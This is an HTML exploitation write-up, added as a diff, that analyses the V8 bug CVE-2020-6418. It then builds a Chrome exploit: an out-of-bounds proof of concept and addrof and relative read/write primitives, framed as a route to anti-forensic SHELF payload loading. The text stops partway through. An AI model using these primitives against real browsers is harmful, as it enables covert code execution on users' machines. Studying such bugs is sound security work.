@@ -1,0 +1,1459 @@
+<html>
+<head>
+<title>SHELF encounters of the elements kind</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                                 ┌───────────────────────┐
+                                                                 ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                                 │ █   █ █ █ █   █       │
+                                                                 │ █   █ █ █ █▀▀▀▀       │
+                                                                 │ █   █   █ █     ▄     │
+                                                                 │                 ▄▄▄▄▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄   ▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄▄▄▄▄ │
+SHELF encounters of the elements kind                            │                   █   │
+Enabling SHELF Loading in Chrome for fun and profit.             │                   █   │
+~ ulexec                                                         └───────────────────█ ──┘
+
+Introduction ─────────────────────────────────────────────────────────────────────────//──
+
+I've been focusing lately on Chrome exploitation, and after a while I became curious of 
+the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
+
+If you are new to the concept of SHELF, it is a reflective loading methodology me and my 
+colleague _Anonymous from Tmp.0ut wrote about<a href="https://tmpout.sh/1/10/">[1]</a> last year.
+
+SHELF-based payloads have a series of incentives, primarily as to be able to reflectively
+deploy large dependency-safe payloads as ELF binaries, without the need to invoke any of 
+the execve family of system calls.
+
+Deploying SHELF payloads is not only convenient from a development perspective, but also 
+from an anti-forensics perspective. This is because the analysis of SHELF images is often
+more complex than conventional ELF binaries or shellcode, since SHELF images are 
+statically compiled, but also position-independent. In addition, SHELF images can be 
+crafted to avoid the use of common ELF data structures critical for image reconstruction, 
+also leaving no process-hierarchy footprint in contrast to the execve family of system 
+calls.
+
+In conclusion, SHELF has great prospects to be used within the browser to reflectively 
+load arbitrary payloads in the form of self-contained ELF binaries with anti-forensic 
+characteristics.
+
+In this article, I will demonstrate how SHELF loading can be achieved on a Chrome exploit,
+starting from an initial set of relative arbitrary read/write primitives to V8's heap.
+
+I also wanted to present a concise analysis of a vulnerability that would grant these 
+kinds of initial exploitation primitives. I will be covering a vulnerability I've been 
+recently analyzing, CVE-2020-6418. However, feel free to skip to the Achieving Relative 
+Arbitrary Read/Write section if you are not interested in the root-cause analysis of this
+particular vulnerability.
+
+I would like to apologize in advance if there are still some mistakes or wrong assertions
+I may have skipped over, or simply was unaware of during the creation of this article.
+
+CVE-2020-6418 ────────────────────────────────────────────────────────────────────────//──
+
+:: Regression Test Analysis ::
+
+If we check the bug issue for this vulnerability, we can observe that a regression test<a href="https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js">[2]</a>
+file was committed, which will serve us as an intial PoC for the given vulnerability. 
+
+This regression test looks as follows:
+
+  // Copyright 2020 the V8 project authors. All rights reserved.
+  // Use of this source code is governed by a BSD-style license that can be
+  // found in the LICENSE file.
+  // Flags: --allow-natives-syntax
+  let a = [0, 1, 2, 3, 4];
+  function empty() {}
+  function f(p) {
+    a.pop(Reflect.construct(empty, arguments, p));
+  }
+  let p = new Proxy(Object, {
+      get: () =&gt; (a[0] = 1.1, Object.prototype)
+  });
+  function main(p) {
+    f(p);
+  }
+  %PrepareFunctionForOptimization(empty);
+  %PrepareFunctionForOptimization(f);
+  %PrepareFunctionForOptimization(main);
+  main(empty);
+  main(empty);
+  %OptimizeFunctionOnNextCall(main);
+  main(p);
+
+We can also inspect the bug report<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">[3]</a> for a nice overview of the vulnerability:
+
+  Incorrect side effect modelling for JSCreate
+
+  The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring 
+  the Map of an object. From the documentation: "This information can be either 
+  "reliable", meaning that the object is guaranteed to have one of these maps at runtime,
+  or "unreliable", meaning that the object is guaranteed to have HAD one of these maps.".
+  In the latter case, the caller has to ensure that the object has the correct type, 
+  either by using CheckMap nodes or CodeDependencies.
+
+  On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until 
+  it finds the node creating the object in question and, at the same time, marks the 
+  result as unreliable if it encounters a node without the kNoWrite flag [2], indicating
+  that executing the node could have side-effects such as changing the Maps of an object.
+  There is a mistake in the handling of kJSCreate [3]: if the object in question is not 
+  the output of kJSCreate, then the loop continues *without* marking the result as 
+  unreliable. This is incorrect because kJSCreate can have side-effects, for example by 
+  using a Proxy as third argument to Reflect.construct. The bug can then for example be 
+  triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles 
+  during the unexpected side effect.
+
+As seen in the bug report, the vulnerability consists of incorrect side effect modeling 
+for JSCreate. In other words, arbitrary JavaScript code can be invoked at some point 
+during the processing of JSCreate in Ignition (V8's interpreter) generated instructions,
+that would impact the behavior of Turbofan's JIT compilation pipeline.
+
+If we modify the provided regression test to return the value popped from the array a, we
+will see the following:
+
+  $ out.gn/x64.release/d8 --allow-natives-syntax ../regress.js
+  0
+
+The value popped after the third call to function <x>main</x> is <x>0</x>, when in reality it should 
+have returned 2. This means that the call to <x>main(p)</x> is somehow influencing the behavior
+of array <x>a</x>'s elements. We can see this clearly with the following modifications to the 
+regression test:
+
+  let a = [1.1, 1.2, 1.3, 1.4, 1.5];
+  function empty() {}
+  function f(p) {
+    return a.pop(Reflect.construct(empty, arguments, p));
+  }
+  let p = new Proxy(Object, {
+      get: () =&gt; (a[0] = {}, Object.prototype)
+  });
+  function main(p) {
+    return f(p);
+  }
+  %PrepareFunctionForOptimization(empty);
+  %PrepareFunctionForOptimization(f);
+  %PrepareFunctionForOptimization(main);
+  main(empty);
+  main(empty);
+  %OptimizeFunctionOnNextCall(main);
+  print(main(p));
+
+
+If we run the previous script we will see the following:
+
+  $ out.gn/x64.release/d8 --allow-natives-syntax ./regress.js          
+  4.735317402428105e-270
+
+The elements kind of array a has transitioned from <x>PACKED_DOUBLE_ELEMENTS</x> to 
+<x>PACKED_ELEMENTS</x>, however, popped values of a via <x>Array.prototype.pop</x> still return 
+elements of type <x>double</x>. This transition of _element kind_ can be shown in the 
+diagram below, showing the allowed element kinds transitions within V8's JSArrays:
+
+<img src="./img/Screenshot%202021-05-03%20at%2013.00.23%201.png" width=700px>
+
+At this point, we can only speculate what is provoking this behavior. However, based on 
+observed triage of the regression test, this change of _elements kind_ is likely provoked
+by the <x>Proxy</x> function, redeclaring <x>a[0]</x> indexed property as an <x>JSObject</x> instead of a 
+<x>double</x> value.
+
+We can also suspect that this redeclaration of one of the elements of a has likely 
+provoked V8 to reallocate the array, propagating a different _elements kind_ to <x>a</x>, 
+converting <x>a</x>'s elements' to <x>HeapNumber</x> objects from <x>double</x> values. However, it's 
+likely that the _elements kind_ inferred by <x>Array.prototype.pop</x> is incorrect, as 
+<x>double</x> values are still being retrieved.
+
+This can be shown in the following d8 run below, in which calls to the native function 
+<x>%DebugPrint</x> have been placed in the appropriate places in the PoC script before and after
+the transition of elements kind:
+
+  $ out.gn/x64.debug/d8 --allow-natives-syntax ../regress.js
+  //----------------------------[BEFORE]--------------------------------
+  DebugPrint: 0x3d04080c6031: [JSArray]
+   - map: 0x3d0408281909 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+   - prototype: 0x3d040824923d &lt;JSArray[0]&gt;
+   - elements: 0x3d04080c6001 &lt;FixedDoubleArray[5]&gt; [PACKED_DOUBLE_ELEMENTS]
+   - length: 5
+   - properties: 0x3d04080406e9 &lt;FixedArray[0]&gt; {
+      #length: 0x3d04081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)
+   }
+   - elements: 0x3d04080c6001 &lt;FixedDoubleArray[5]&gt; {
+           0-1: 1.1
+             2: 1.2
+             3: 1.3
+             4: 1.4
+   }
+  0x3d0408281909: [Map]
+   - type: JS_ARRAY_TYPE
+   - instance size: 16
+   - inobject properties: 0
+   - elements kind: PACKED_DOUBLE_ELEMENTS
+   - unused property fields: 0
+   - enum length: invalid
+   - back pointer: 0x3d04082818e1 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;
+   - prototype_validity cell: 0x3d04081c0451 &lt;Cell value= 1&gt;
+   - instance descriptors #1: 0x3d04082498c1 &lt;DescriptorArray[1]&gt;
+   - transitions #1: 0x3d040824990d &lt;TransitionArray[4]&gt;Transition array #1:
+       0x3d0408042f75 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3d0408281931 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
+  
+   - prototype: 0x3d040824923d &lt;JSArray[0]&gt;
+   - constructor: 0x3d0408249111 &lt;JSFunction Array (sfi = 0x3d04081cc2dd)&gt;
+   - dependent code: 0x3d04080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+   - construction counter: 0
+  
+  //-----------------------------[AFTER]---------------------------------
+  4.735317402428105e-270
+  
+  DebugPrint: 0x3d04080c6031: [JSArray]
+   - map: 0x3d0408281959 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
+   - prototype: 0x3d040824923d &lt;JSArray[0]&gt;
+   - elements: 0x3d04080c6295 &lt;FixedArray[5]&gt; [PACKED_ELEMENTS]
+   - length: 2
+   - properties: 0x3d04080406e9 &lt;FixedArray[0]&gt; {
+      #length: 0x3d04081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)
+   }
+   - elements: 0x3d04080c6295 &lt;FixedArray[5]&gt; {
+             0: 0x3d04080c6279 &lt;Object map = 0x3d04082802d9&gt;
+             1: 0x3d04080c62bd &lt;HeapNumber 1.1&gt;
+  Received signal 11 SEGV_ACCERR 3d04fff80006
+  // ^ V8 CRASHES FETCHING ELEMENTS IN DEBUG BUILD
+
+We can leverage a type-confusion vulnerability when trying to access any of the elements 
+of <x>a</x>, as we will be fetching a double representation of a <x>HeapNumber</x> object's tagged 
+pointer. This vulnerability would enable us to trivially create <x>addrof</x> and <x>fakeobj</x>
+primitives. However, we will see moving forward that this won’t work in newer V8 versions,
+and that in order to exploit this vulnerability a different exploitation strategy will be
+required.
+
+This is all there is to understand for now in relation to the supplied regression test. 
+Now let's dig deep into identifying the root-cause analysis in v8's source code.
+
+Root-Cause Analysis ──────────────────────────────────────────────────────────────────//──
+
+Now that we have done a quick overview of the vulnerability and its implications from the 
+regression test, let's take a deep dive into V8's source to identify the root-cause 
+analysis for this vulnerability.
+
+To start off, it is important to have in mind a high-level overview of Turbofan's JIT 
+compilation pipeline shown in the following diagram:
+
+<img src="./img/Pasted%20image%2020220112200715.png" width=700px>
+
+Within the distinct Turbofan's phases, we can highlight the inlining/specialization phase,
+in which lowering of builtin functions and reduction of specific nodes is performed, such
+as <x>JSCall</x> reduction and <x>JSCreate</x> lowering:
+
+  // Performs strength reduction on {JSConstruct} and {JSCall} nodes,
+  // which might allow inlining or other optimizations to be performed afterwards.
+  class V8_EXPORT_PRIVATE JSCallReducer final : public AdvancedReducer {
+   public:
+    // Flags that control the mode of operation.
+    enum Flag { kNoFlags = 0u, kBailoutOnUninitialized = 1u &lt;&lt; 0 };
+    using Flags = base::Flags&lt;Flag&gt;;
+  
+    JSCallReducer(Editor* editor, JSGraph* jsgraph, JSHeapBroker* broker,
+                  Zone* temp_zone, Flags flags,
+                  CompilationDependencies* dependencies)
+        : AdvancedReducer(editor),
+          jsgraph_(jsgraph),
+          broker_(broker),
+          temp_zone_(temp_zone),
+          flags_(flags),
+          dependencies_(dependencies) {}
+
+  // Lowers JSCreate-level operators to fast (inline) allocations.
+  class V8_EXPORT_PRIVATE JSCreateLowering final
+      : public NON_EXPORTED_BASE(AdvancedReducer) {
+   public:
+    JSCreateLowering(Editor* editor, CompilationDependencies* dependencies,
+                     JSGraph* jsgraph, JSHeapBroker* broker, Zone* zone)
+        : AdvancedReducer(editor),
+          dependencies_(dependencies),
+          jsgraph_(jsgraph),
+          broker_(broker),
+          zone_(zone) {}
+    ~JSCreateLowering() final = default;
+  
+    const char* reducer_name() const override { return "JSCreateLowering"; }
+  
+    Reduction Reduce(Node* node) final;
+  
+   private:
+    Reduction ReduceJSCreate(Node* node);
+
+For our previous PoC's Inlining phase, reduction of <x>Array.prototype.pop</x> built-in function
+will be performed.
+
+The function in charge of doing so is <x>JSCallReducer::ReduceArrayPrototypePop(Node* node)</x>
+shown below:
+
+  // ES6 section 22.1.3.17 Array.prototype.pop ( )
+  Reduction JSCallReducer::ReduceArrayPrototypePop(Node* node) {
+    DisallowHeapAccessIf disallow_heap_access(FLAG_concurrent_inlining);
+  
+    DCHECK_EQ(IrOpcode::kJSCall, node-&gt;opcode());
+    CallParameters const& p = CallParametersOf(node-&gt;op());
+    if (p.speculation_mode() == SpeculationMode::kDisallowSpeculation) {
+      return NoChange();
+    }
+  
+    Node* receiver = NodeProperties::GetValueInput(node, 1);
+    Node* effect = NodeProperties::GetEffectInput(node);
+    Node* control = NodeProperties::GetControlInput(node);
+  
+    MapInference inference(broker(), receiver, effect);
+    if (!inference.HaveMaps()) return NoChange();
+    MapHandles const& receiver_maps = inference.GetMaps();
+  
+    std::vector&lt;ElementsKind&gt; kinds;
+    if (!CanInlineArrayResizingBuiltin(broker(), receiver_maps, &kinds)) {
+      return inference.NoChange();
+    }
+    if (!dependencies()-&gt;DependOnNoElementsProtector()) UNREACHABLE();
+    inference.RelyOnMapsPreferStability(dependencies(), jsgraph(),
+                                        &effect, control, p.feedback());
+  
+      ...
+  
+  // Load the "length" property of the {receiver}.
+  // Check if the {receiver} has any elements.
+  // Load the elements backing store from the {receiver}.
+  // Ensure that we aren't popping from a copy-on-write backing store.
+  // Compute the new {length}.
+  // Store the new {length} to the {receiver}.
+  // Load the last entry from the {elements}.
+  // Store a hole to the element we just removed from the {receiver}.
+  // Convert the hole to undefined. Do this last, so that we can optimize
+  // conversion operator via some smart strength reduction in many cases.
+   
+      ...
+      
+    ReplaceWithValue(node, value, effect, control);
+    return Replace(value);
+  }
+
+This function will fetch the map of the receiver node by invoking <x>MapInference inference(broker(), receiver, effect)</x>
+to then retrieve its elements kind as well as implement the logic for <x>Array.protype.pop</x>.
+Major operations performed by this function are summarized by the comments in the source
+code shown above for sake of simplicity.
+
+We should also highlight the call to <x>inference.RelyOnMapsPreferStability</x>, which we will
+cover in a later stage. For now, let's focus on the call to <x>MapInference</x> constructor 
+along with some of its instance methods. These are shown below:
+  
+  MapInference::MapInference(JSHeapBroker* broker, Node* object, Node* effect)
+      : broker_(broker), object_(object) {
+    ZoneHandleSet&lt;Map&gt; maps;
+    auto result =
+        NodeProperties::InferReceiverMapsUnsafe(broker_, object_, effect, &maps);
+    maps_.insert(maps_.end(), maps.begin(), maps.end());
+    maps_state_ = (result == NodeProperties::kUnreliableReceiverMaps)
+                      ? kUnreliableDontNeedGuard
+                      : kReliableOrGuarded;
+    DCHECK_EQ(maps_.empty(), result == NodeProperties::kNoReceiverMaps);
+  }
+  
+  MapInference::~MapInference() { CHECK(Safe()); }
+  
+  bool MapInference::Safe() const { return maps_state_ != kUnreliableNeedGuard; }
+  
+  void MapInference::SetNeedGuardIfUnreliable() {
+    CHECK(HaveMaps());
+    if (maps_state_ == kUnreliableDontNeedGuard) {
+      maps_state_ = kUnreliableNeedGuard;
+    }
+  }
+  
+  void MapInference::SetGuarded() { maps_state_ = kReliableOrGuarded; }
+  
+  bool MapInference::HaveMaps() const { return !maps_.empty(); }
+
+We can notice that at the beginning of the function, a call to <x>NodeProperties::InferReceiverMapsUnsafe</x>
+is performed. This function walks the effect chain in search for a node that can give 
+hints into inferring the map of the receiver object. At the same time, this function is
+also in charge of marking the result as unreliable if it encounters a node without the 
+<x>kNoWrite</x> flag, indicating that executing the node could have side-effects such as changing
+the map of an object.
+
+This function returns an enum composed of three possible values which are the following:
+
+  // Walks up the {effect} chain to find a witness that provides map
+  // information about the {receiver}. Can look through potentially
+  // side effecting nodes.
+    enum InferReceiverMapsResult {
+      kNoReceiverMaps,         // No receiver maps inferred.
+      kReliableReceiverMaps,   // Receiver maps can be trusted.
+      kUnreliableReceiverMaps  // Receiver maps might have changed (side-effect).
+
+A summerized overview of the implementation of <x>NodeProperties::InferReceiverMapsUnsafe</x> is
+shown below, highlighting the most important parts of this function:
+
+  // static
+  NodeProperties::InferReceiverMapsResult NodeProperties::InferReceiverMapsUnsafe(
+      JSHeapBroker* broker, Node* receiver, Node* effect,
+      ZoneHandleSet&lt;Map&gt;* maps_return) {
+    HeapObjectMatcher m(receiver);
+    if (m.HasValue()) {
+      HeapObjectRef receiver = m.Ref(broker);
+      // We don't use ICs for the Array.prototype and the Object.prototype
+      // because the runtime has to be able to intercept them properly, so
+      // we better make sure that TurboFan doesn't outsmart the system here
+      // by storing to elements of either prototype directly.
+      //
+      if (!receiver.IsJSObject() ||
+          !broker-&gt;IsArrayOrObjectPrototype(receiver.AsJSObject())) {
+        if (receiver.map().is_stable()) {
+          // The {receiver_map} is only reliable when we install a stability
+          // code dependency.
+          *maps_return = ZoneHandleSet&lt;Map&gt;(receiver.map().object());
+          return kUnreliableReceiverMaps;
+        }
+      }
+    }
+    InferReceiverMapsResult result = kReliableReceiverMaps;
+    while (true) {
+      switch (effect-&gt;opcode()) {
+      
+      ...
+      
+        case IrOpcode::kJSCreate: {
+          if (IsSame(receiver, effect)) {
+            base::Optional&lt;MapRef&gt; initial_map = GetJSCreateMap(broker, receiver);
+            if (initial_map.has_value()) {
+              *maps_return = ZoneHandleSet&lt;Map&gt;(initial_map-&gt;object());
+              return result;
+            }
+            // We reached the allocation of the {receiver}.
+            return kNoReceiverMaps;
+          }
+            //result = kUnreliableReceiverMaps;  
+            // ^ applied patch: JSCreate can have a side-effect.        
+          break;
+        }
+
+      ...
+
+In this function, we can focus on the switch case nested in a while loop that traverses
+the effect chain. Each case in the switch case consists of specific nodes denoting 
+Ignition opcodes relevant for map inference, in particular the opcode <x>IrOpcode::kJSCreate</x>.
+
+This opcode will be generated for the invocation of <x>Reflect.construct</x>. Eventually, the 
+while loop will run out of nodes to check and will fail to find an effect node with a 
+map similar to the one of the receiver since the receiver map was changed via the Proxy
+function invocation in <x>Reflect.construct</x>. However, the function will still return a result
+of <x>kReliableReceiverMaps</x> despite having the receiver's map not being reliable.
+
+We can see the patch applied to this function commented out, highlighting where the 
+vulnerability resides. The invocation of <x>Reflect.construct</x> will in fact be able to 
+change the maps of the receiver node, in this case the <x>JSArray a</x>. However, due to a 
+logical error, <x>NodeProperties::InferReceiverMapsUnsafe</x> will fail to mark this node as
+<x>kUnreliableReceiverMaps</x>, as to denote that the receiver maps may have changed.
+
+The implications of not marking this node as unreliable will become clear by the result
+of the invokation of <x>MapInference::RelyOnMapsPreferStability</x> by <x>JSCallReducer::ReduceArrayPrototypePop</x>
+shown below:
+
+  bool MapInference::RelyOnMapsPreferStability(
+      CompilationDependencies* dependencies, JSGraph* jsgraph, Node** effect,
+      Node* control, const FeedbackSource& feedback) {
+    CHECK(HaveMaps());
+    if (Safe()) return false;
+    if (RelyOnMapsViaStability(dependencies)) return true;
+    CHECK(RelyOnMapsHelper(nullptr, jsgraph, effect, control, feedback));
+    return false;
+  }
+  
+  
+  bool MapInference::RelyOnMapsHelper(CompilationDependencies* dependencies,
+                                      JSGraph* jsgraph, Node** effect,
+                                      Node* control,
+                                      const FeedbackSource& feedback) {
+    if (Safe()) return true;
+  
+    auto is_stable = [this](Handle&lt;Map&gt; map) {
+      MapRef map_ref(broker_, map);
+      return map_ref.is_stable();
+    };
+    if (dependencies != nullptr &&
+        std::all_of(maps_.cbegin(), maps_.cend(), is_stable)) {
+      for (Handle&lt;Map&gt; map : maps_) {
+        dependencies-&gt;DependOnStableMap(MapRef(broker_, map));
+      }
+      SetGuarded();
+      return true;
+    } else if (feedback.IsValid()) {
+      InsertMapChecks(jsgraph, effect, control, feedback);
+      return true;
+    } else {
+      return false;
+    }
+  }
+
+We can observe that a call to <x>MapInference::Safe()</x> will be done, and if succesful, the 
+function will return immediately. The implementation of this function is the following:
+
+  bool MapInference::Safe() const {
+      return maps_state_ != kUnreliableNeedGuard; }
+
+Because the JSCreate node was never marked as <x>kUnreliableReceiverMaps</x>, this function will
+always return true. This comparative operation can be shown below.
+
+  maps_state_ = (result == NodeProperties::kUnreliableReceiverMaps)
+                      ? kUnreliableDontNeedGuard
+                      : kReliableOrGuarded;
+
+The code path that should mitigate this vulnerability is the one in which the function 
+<x>InsertMapChecks</x> is invoked. This function will be in charge to add a <x>CheckMaps</x> node before
+the effect nodes loading and storing the popped element from the receiver object takes 
+place, assuring that a correct map will be used for these operations.
+
+We can see that if we invoke <x>Reflect.construct</x> outside the context of <x>Array.prototype.pop</x>,
+a <x>CheckMaps</x> node is inserted, as it should for the conventional use of this function:
+
+<img src="./img/Pasted%20image%2020220112204523.png" width=700px>
+
+However, if the invocation of <x>Reflect.construct</x> is within <x>Array.protoype.pop</x> context, 
+this will trigger the vulnerability and Turbofan will assume that the map of the receiver
+object is reliable and will not add a <x>CheckMaps</x> node as show below:
+
+<img src="./img/Pasted%20image%2020220112204615.png" width=700px>
+
+Exploit Strategy ─────────────────────────────────────────────────────────────────────//──
+
+As previously mentioned, this vulnerability allows us to trivially craft <x>addrof</x> and 
+<x>fakeobj</x> primitives. A common technique to exploit the current scenario, in which only 
+<x>addrof</x> and <x>fakeobj</x> primitives are available without OOB read/write, is by crafting a fake
+<x>ArrayBuffer</x> object with an arbitrary backing pointer. However, this approach becomes 
+difficult with V8's pointer compression enabled<a href="https://v8.dev/blog/pointer-compression">[4]</a> since version 8.0.<a href="https://v8.dev/blog/v8-release-80">[5]</a>
+
+This is because with pointer compression, tagged pointers are stored within V8's heap as 
+<x>dwords</x>, while double values are stored as <x>qwords</x>. This implicitly impacts our ability to 
+create an effective <x>fakeobj</x> primitive for this specific scenario.
+
+█<hl> If you are interested in knowing how this exploit would look like without pointer       </hl>
+█<hl> compression, here is a really nice writeup by @HawaiiFive0day.<a href="https://leethax0.rs/2021/04/ElectricChrome/">[6]</a>                       </hl>
+
+In order to exploit this vulnerability, we have to use a different approach that will
+leverage the mechanics of V8's pointer compression to our advantage.
+
+As previously mentioned, when a new indexed property of different _elements kind_ gets
+stored into array <x>a</x>, the array will be reallocated, and their elements updated 
+corresponding to the new array's _elements kind_ transition.
+
+However, this leaves for an interesting caveat that is useful for absuing pointer 
+compression-enabled element transitioning. If the elements of the subject array are 
+originally of elements kind <x>PACKED_DOUBLE_ELEMENTS</x> and this array is transitioning to 
+<x>PACKED_ELEMENTS</x>, this will ultimately create an array half of the size of the original 
+one, since <x>PACKED_ELEMENTS</x> corresponds to elements stored as <x>dword</x> tagged pointers when
+pointer compression is enabled, in contrast to double values stored as <x>qwords</x> as 
+previously mentioned.
+
+Since the map inference of the array is incorrect after the array has transitioned to 
+<x>PACKED_ELEMENTS</x> and any <x>JSArray</x> builtin function is subject to this wrong map inference,
+we can abuse this scenario to achieve OOB read/write via the use of <x>Array.prototype.pop</x>
+and <x>Array.prototype.push</x>.
+
+However, there is a more convenient avenue for exploitation documented by Exodus 
+Intelligence.<a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/">[7]</a> Instead of recurrently using <x>JSArray</x> builtin functions as <x>Array.prototype.pop</x>
+and <x>Array.prototype.push</x> to read and write memory, a single OOB write can be leveraged
+to overwrite the length field of an adjacent array in memory. This will enable an easier
+approach to build stronger primitives moving forward. Here is a PoC for this exploitation
+strategy:
+
+  let a = [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.1];
+  var b;
+  
+  function empty() {}
+  function f(nt) {
+      a.push(typeof(
+          Reflect.construct(empty, arguments, nt)) === Proxy
+             ? 2.2
+             : 2261634.000029185 //0x414141410000f4d2 -&gt; 0xf4d2 = 31337 * 2
+      );
+  }
+  
+  let p = new Proxy(Object, {
+      get: function() {
+          a[0] = {};
+          b = [1.2, 1.2];
+          return Object.prototype;
+      }
+  });
+  
+  function main(o) {
+    return f(o);
+  }
+  
+  %PrepareFunctionForOptimization(empty);
+  %PrepareFunctionForOptimization(f);
+  %PrepareFunctionForOptimization(main);
+  main(empty);
+  main(empty);
+  %OptimizeFunctionOnNextCall(main);
+  main(p);
+  
+  console.log(b.length);   // prints 31337
+
+Achieving Relative Arbitrary Read/Write ──────────────────────────────────────────────//──
+
+Once we have achieved OOB read/write and successfully overwritten the length of an 
+adjacent array, we can now read/write into adjacent memory.
+
+From this point forward, we can neglect the original vulnerability, and think of the next
+sections independently of the specific vulnerability as long as we can achive OOB 
+read/write from a JSArray with <x>PACKED_DOUBLE_ELEMENTS</x> _elements kind_.
+
+In order to read/write memory with more flexibility, we need to build a set of read/write 
+primitives as well as to gain the ability to retrieve the address of arbitrary objects via
+an <x>addrof</x> primitive.
+
+This can be done by replacing the value of the elements tagged pointer of an adjacent 
+double array (c) via our OOB double array (b). If we replace the value of this field we 
+will be able to dereference its contents while accessing the elements of <x>c</x>, ultimately 
+enabling us to read or write to tagged pointers.
+
+In addition, an <x>addrof</x> primitive can be achieved by leaking the maps of adjacent 
+boxed/unboxed arrays, and interchanging these also in an adjacent double array.
+
+The implementation of these primitives having our preliminar OOB access can be shown 
+as follows:
+
+  var a = [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.1];
+  var b;
+                  
+  //triggering Turbofan side-effect bug leveraging OOB write to b
+  oob();
+  // adjacent OOB-accesible arrays from double array b
+  var c = [1.1, 1.1, 1.1]
+  var d = [{}, {}];
+  var e = new Float64Array(8)
+  
+  //leaking maps of boxed/unboxed adjacent arrays
+  var flt_map = ftoi(b[14]) &gt;&gt; 32n;
+  var obj_map = ftoi(b[25]) &gt;&gt; 32n;
+  
+  function addrof(obj) {
+      let tmp = b[14]; // accesing array c's map tagged pointer    
+      let tmp_elm = c[0];
+      // overwritting only higher dword
+      b[14] = itof(((obj_map &lt;&lt; 32n) + (ftoi(tmp) & 0xffffffffn)));
+      c[0] = obj;
+      b[14] = itof(((flt_map &lt;&lt; 32n) + (ftoi(tmp) & 0xffffffffn)));  
+      let leak = itof(ftoi(c[0]) & 0xffffffffn);
+      b[14] = tmp;
+      c[0] = tmp_elm;
+      return leak;
+  }
+  
+  function weak_read(addr) {
+      let tmp = b[15]; // accessing elements pointer of c
+      b[15] = itof((((ftoi(addr)-8n) &lt;&lt; 32n) + (ftoi(tmp) & 0xffffffffn)));
+      let result = c[0];
+      b[15] = tmp;
+      return result;
+  }
+  
+  function weak_write(addr, what) {
+      let tmp = b[15];
+      b[15] = itof((((ftoi(addr)-8n) &lt;&lt; 32n) + (ftoi(tmp) & 0xffffffffn)));
+      c[0] = what;
+      b[15] = tmp;
+      return;
+  }
+
+Achieving Unstable Arbitrary Read/Write ──────────────────────────────────────────────//──
+
+Unfortunately, this primitive is restricted to 8 bytes per operation to V8's tagged 
+pointers, hence the <x>weak</x> prefix as these primitives are relative to V8's heap.
+
+In order to circumvent this limitation, we will have to perform the following steps to 
+build a stronger read/write primitive:
+
+- Leak <x>isolate root</x> to resolve any V8 tagged pointer to its unboxed representation.
+- Overwrite the unboxed <x>backing_store</x> pointer of an ArrayBuffer and access it via a 
+  DataView object, enabling us to read and write memory to unboxed addresses, with sizes
+  not limited to 8 bytes per operation.
+
+In order to leak the value of <x>isolate root</x>, we can leverage our <x>weak_read</x> primitive
+to leak the value of <x>external_pointer</x> from a typed array. To illustrate this, let's take
+a look at the fields of a <x>Uint8Array</x> object:
+
+  d8&gt; a = new Uint8Array(8)
+  0,0,0,0,0,0,0,0
+  d8&gt; %DebugPrint(a)
+  DebugPrint: 0x3fee080c5e69: [JSTypedArray]
+   - map: 0x3fee082804e1 &lt;Map(UINT8ELEMENTS)&gt; [FastProperties]
+   - prototype: 0x3fee082429b9 &lt;Object map = 0x3fee08280509&gt;
+   - elements: 0x3fee080c5e59 &lt;ByteArray[8]&gt; [UINT8ELEMENTS]
+   - embedder fields: 2
+   - buffer: 0x3fee080c5e21 &lt;ArrayBuffer map = 0x3fee08281189&gt;
+   - byte_offset: 0
+   - byte_length: 8
+   - length: 8
+   - data_ptr: 0x3fee080c5e60  &lt;-------------------------------
+     - base_pointer: 0x80c5e59
+     - external_pointer: 0x3fee00000007
+   - properties: 0x3fee080406e9 &lt;FixedArray[0]&gt; {}
+   - elements: 0x3fee080c5e59 &lt;ByteArray[8]&gt; {
+           0-7: 0
+   }
+   - embedder fields = {
+      0, aligned pointer: (nil)
+      0, aligned pointer: (nil)
+   }
+  0x3fee082804e1: [Map]
+   - type: JS_TYPED_ARRAY_TYPE
+   - instance size: 68
+   - inobject properties: 0
+   - elements kind: UINT8ELEMENTS
+   - unused property fields: 0
+   - enum length: invalid
+   - stable_map
+   - back pointer: 0x3fee0804030d &lt;undefined&gt;
+   - prototype_validity cell: 0x3fee081c0451 &lt;Cell value= 1&gt;
+   - instance descriptors (own) #0: 0x3fee080401b5 &lt;DescriptorArray[0]&gt;
+   - prototype: 0x3fee082429b9 &lt;Object map = 0x3fee08280509&gt;
+   - constructor: 0x3fee08242939 &lt;JSFunction Uint8Array (sfi = 0x3fee081c65c1)&gt;
+   - dependent code: 0x3fee080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+   - construction counter: 0
+  
+  0,0,0,0,0,0,0,0
+  d8&gt;
+
+The value of <x>data_ptris</x>, the result of the addition of <x>base_pointer</x> and <x>external_pointer</x>,
+and the value of <x>external_pointer</x>, is ultimately the value we want. If we apply a binary
+mask to negate the value of the last byte of <x>external_pointer</x>, we will retrieve the value
+of <x>isolate root</x> -- V8's heap base:
+
